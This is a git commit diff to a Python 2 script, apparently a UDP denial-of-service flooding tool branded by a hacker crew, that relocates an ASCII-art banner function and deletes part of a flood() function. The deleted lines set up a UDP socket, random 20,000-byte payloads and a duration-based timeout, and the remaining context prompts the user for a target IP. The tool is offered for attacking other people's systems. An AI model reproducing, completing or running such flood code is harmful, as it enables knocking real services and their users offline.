b33f4f2cc8f6eafb18046ac838503544ef000794
MR-ASHFLYY <87230209+MR-ASHFLYY@users.noreply.github.com>
2021-07-10 20:00:03 +0800

    Update TOOLDDOSV-19.py

--- TOOLDDOSV-19.py
+++ TOOLDDOSV-19.py
@@ -3,6 +3,19 @@ import os
 import time
 import socket
 import random
+def usage():
+    print "\033[1;32m#############################################################"
+    print "#------------------------[\033[1;91mVARIANS 19 CREW\033[1;32m]---------------------#"
+    print "         __     __       _     ___       __    ____    ___  _         _  "
+    print "         \ \   / /      / |   / _ \     / _|  |  _ \  | __| \ \      / / "
+    print "          \ \ / /_____  | |  | (_) |   | |    | |_) | | __|  \ \ /\ / / "
+    print "           \ V /|_____| | |  \__,  |   | |_   |  _<   | |_    \ V  V /    "
+    print "            \_/         |_|     /_/     \__|  |_| \_\ |___|    \_/\_/   "
+    print "------------------------[\033[1;91mLEADER:KUACIBASI\033[1;32m]---------------------#"
+    print "#############################################################"
+    print "                        CREATOR:MR.ASHFLYY"
+    print "                       #WE ARE MALAYSIAN HACKER"
+    print "                       #WE ARE MUSLIM HACKER"
 #Code Time
 from datetime import datetime
 now = datetime.now()
@@ -20,28 +33,7 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet VARIANS 19")
 
-def usage():
-    print "\033[1;32m#############################################################"
-    print "#------------------------[\033[1;91mVARIANS 19 CREW\033[1;32m]---------------------#"
-    print "         __     __       _     ___       __    ____    ___  _         _  "
-    print "         \ \   / /      / |   / _ \     / _|  |  _ \  | __| \ \      / / "
-    print "          \ \ / /_____  | |  | (_) |   | |    | |_) | | __|  \ \ /\ / / "
-    print "           \ V /|_____| | |  \__,  |   | |_   |  _<   | |_    \ V  V /    "
-    print "            \_/         |_|     /_/     \__|  |_| \_\ |___|    \_/\_/   "
-    print "------------------------[\033[1;91mLEADER:KUACIBASI\033[1;32m]---------------------#"
-    print "#############################################################"
-    print "                        CREATOR:MR.ASHFLYY"
-    print "                       #WE ARE MALAYSIAN HACKER"
-    print "                       #WE ARE MUSLIM HACKER"
-    print
-def flood(victim, vport, duration):
-    # Support us yaakk... :)
-    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
-    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    # 20000 representasi satu byte ke server
-    bytes = random._urandom(20000)
-    timeout =  time.time() + duration
-    sent = 3000
+
 
 
 ip = raw_input("Masukkan IP Target : ")
